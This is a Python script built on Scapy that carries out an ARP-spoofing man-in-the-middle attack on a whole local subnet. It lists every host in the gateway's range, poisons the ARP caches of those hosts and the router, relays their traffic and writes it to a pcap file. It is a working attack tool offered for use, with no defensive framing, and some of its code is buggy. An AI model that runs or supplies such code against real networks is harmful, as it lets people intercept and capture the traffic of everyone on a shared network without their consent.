from scapy.all import *
from scapy.interfaces import *
from threading import Thread
import logging
import time
import sys
import ipaddress

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


def fprint(data):
    sys.stdout(data)


def get_subnet_ips(gateway_ip):
    """Return all IP addresses in the local subnet except gateway and attacker IP"""
    # Get attacker's IP on the interface
    attacker_ip = get_if_addr(iface)
    
    # Create IP network object based on gateway IP and common subnet masks
    ip_obj = ipaddress.ip_address(gateway_ip)
    
    # Common private network prefixes
    if ip_obj.is_private:
        if ip_obj.version == 4:
            # Handle common private IPv4 ranges
            if ip_obj in ipaddress.ip_network('10.0.0.0/8'):
                network = ipaddress.ip_network(f'{gateway_ip}/8', strict=False)
            elif ip_obj in ipaddress.ip_network('172.16.0.0/12'):
                network = ipaddress.ip_network(f'{gateway_ip}/12', strict=False)
            elif ip_obj in ipaddress.ip_network('192.168.0.0/16'):
                network = ipaddress.ip_network(f'{gateway_ip}/16', strict=False)
            else:
                # Default to /24 if none of the above
                network = ipaddress.ip_network(f'{gateway_ip}/24', strict=False)
        else:
            # For IPv6, use /64 which is typical for local networks
            network = ipaddress.ip_network(f'{gateway_ip}/64', strict=False)
    else:
        # For public IPs, be more conservative with a /24 subnet
        network = ipaddress.ip_network(f'{gateway_ip}/24', strict=False)
    
    # Return all hosts in network except gateway and attacker IP
    return [str(host) for host in network.hosts() 
            if str(host) != gateway_ip and str(host) != attacker_ip]


def arp_spoofing(target_ips):
    eth = Ether()
    
    while True:
        for target_ip in target_ips:
            try:
                # Spoof gateway to target
                arp = ARP(pdst=target_ip, psrc=gateway_ip, op="is-at")
                packet = eth / arp
                sendp(packet, iface=iface, verbose=False)
                
                # Spoof target to gateway
                arp1 = ARP(pdst=gateway_ip, psrc=target_ip, op="is-at")
                packet1 = eth / arp1
                sendp(packet1, iface=iface, verbose=False)
            except Exception as e:
                print(f"Error spoofing {target_ip}: {e}")
        
        time.sleep(10)


def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    answ = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    try:
        if answ[0][1].hwsrc is not None:
            return answ[0][1].hwsrc
        else:
            get_mac(ip)
    except:
        get_mac(ip)


def forward_packet(pkt):
    if IP in pkt:
        src_ip = pkt[IP].src
        dst_ip = pkt[IP].dst
        
        # Forward packets from target IPs to gateway
        if src_ip in target_ips and pkt[Ether].dst == attacker_mac:
            pkt[Ether].src = attacker_mac
            pkt[Ether].dst = gateway_mac
            sendp(pkt, verbose=False)
        # Forward packets from gateway to target IPs
        elif src_ip == gateway_ip and dst_ip in target_ips and pkt[Ether].dst == attacker_mac:
            pkt[Ether].src = attacker_mac
            pkt[Ether].dst = target_macs[dst_ip]
            sendp(pkt, verbose=False)
        
        wrpcap(filename, pkt, append=True)
        print(f'-----------------------------------------\nPacket intercepted:\nfrom: {src_ip}\nto: {dst_ip}\n')
        
        layers = []
        for i in range(len(pkt.layers())):
            layers.append(pkt.getlayer(i).name)
        print(f'Network layers: ', end='')
        print(*layers)
        
        if TCP in pkt:
            print(f'TCP port: {pkt[TCP].dport}')
        print('-----------------------------------------')


def sniffer():
    # Create filter for all target IPs
    filter_str = f'(ip src {gateway_ip}) or (ip dst {gateway_ip})'
    for ip in target_ips:
        filter_str += f' or (ip src {ip}) or (ip dst {ip})'
    
    sniff(prn=forward_packet, filter=filter_str, iface=iface)


if __name__ == "__main__":
    iface = get_working_if()
    filename = input('Name of .pcap file: ') + '.pcap'
    gateway_ip = input('Router IP in local network: ')
    gateway_mac = get_mac(gateway_ip)
    attacker_mac = get_if_hwaddr(iface)  # Automatically get attacker's MAC
    
    # Get all IPs in subnet
    target_ips = get_subnet_ips(gateway_ip)
    print(f"Found {len(target_ips)} potential targets in the subnet")
    
    # Get MAC addresses for all targets
    target_macs = {}
    for ip in target_ips:
        try:
            mac = get_mac(ip)
            target_macs[ip] = mac
            print(f"Discovered: {ip} -> {mac}")
        except:
            print(f"Could not get MAC for {ip}, removing from target list")
            target_ips.remove(ip)
    
    if not target_ips:
        print("No valid targets found!")
        sys.exit(1)
    
    mitm = Thread(target=arp_spoofing, args=(target_ips,), daemon=True)
    proxy = Thread(target=sniffer)
    
    proxy.start()
    mitm.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Stopping MITM attack...")
        proxy.join()
        sys.exit(0)
